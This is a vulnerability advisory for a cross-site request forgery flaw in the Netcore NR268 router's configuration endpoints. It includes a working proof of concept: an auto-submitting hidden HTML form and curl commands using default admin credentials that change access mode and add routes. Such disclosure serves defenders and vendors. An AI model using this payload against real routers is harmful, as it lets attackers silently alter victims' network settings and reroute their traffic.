# Netcore NR268 Cross-Site Request Forgery on Core Network Configuration Endpoints

**Vendor:** Netcore  
**Product:** NR268 Router  
**Affected Version:** NR268-V1.7.121109.bin  
**Vulnerability Type:** Cross-Site Request Forgery (CWE-352)  
**Credits:** Zhou Ao, Yin Luxing, Jiang Yuxuan, Liu Xin, @Nebusec

## Summary

Mutating CGI endpoints for WAN, routing, NAT, VLAN, DMZ, and UPnP configuration are protected only by HTTP Basic authentication. They read business parameters and immediately forward them to `cgi_SwitchCall()` with no CSRF token, Origin, or Referer check. A hostile page can drive privileged network-configuration changes in an administrator browser that has cached router credentials.

## Technical Details

The HTTP boundary only checks Basic authentication before dispatching these CGI actions. Handlers such as `wan_config_set.cgi`, `routing_tab_add.cgi`, `route_policy_add.cgi`, `virtual_service_add_del.cgi`, and `igd_access_mode.cgi` accept only business fields and then call `cgi_SwitchCall()`. The shared `DataRequest()` helper is a plain `$.post()` wrapper and does not append a CSRF token, nonce, Origin, or Referer value.

### Affected Endpoint

- URL: `/router/igd_access_mode.cgi`, `/router/routing_tab_add.cgi`, `/router/wan_config_set.cgi`, `/router/route_policy_add.cgi`, `/router/virtual_service_add_del.cgi`
- Additional write routes in the same class include WAN/LAN, DMZ, UPnP, VLAN, and route-policy handlers
- Parameters: business fields only; no CSRF token
- Method: POST
- Authentication: victim browser sends cached HTTP Basic credentials

## Proof of Concept

```html
<!doctype html>
<html>
<body onload="document.forms[0].submit()">
  <form method="POST" action="http://192.168.1.1/router/igd_access_mode.cgi">
    <input type="hidden" name="mode" value="1">
    <input type="hidden" name="allow_static" value="1">
    <input type="hidden" name="allow_arp" value="1">
    <input type="hidden" name="allow_pppoe" value="1">
    <input type="hidden" name="allow_pptp" value="1">
    <input type="hidden" name="allow_l2tp" value="1">
  </form>
</body>
</html>
```

```bash
curl -s -u admin:admin -X POST "http://192.168.1.1/router/igd_access_mode.cgi" \
  -d "mode=1&allow_static=1&allow_arp=1&allow_pppoe=1&allow_pptp=1&allow_l2tp=1"

curl -s -u admin:admin -X POST "http://192.168.1.1/router/routing_tab_add.cgi" \
  -d "types=1&ip=10.0.0.0&mask=255.0.0.0&gw=10.0.0.1&ifdev=ppp0&deal=add"
```

### Outcome

The router accepts the cross-site POST and applies the configuration change. No CSRF token, Origin validation, or Referer validation is required.

## Impact

- **Confidentiality:** Medium
- **Integrity:** High – WAN, routing, NAT, DMZ, and access-mode state can be changed
- **Availability:** Medium

A victim administrator who visits a hostile page can be forced into privileged network-configuration changes.
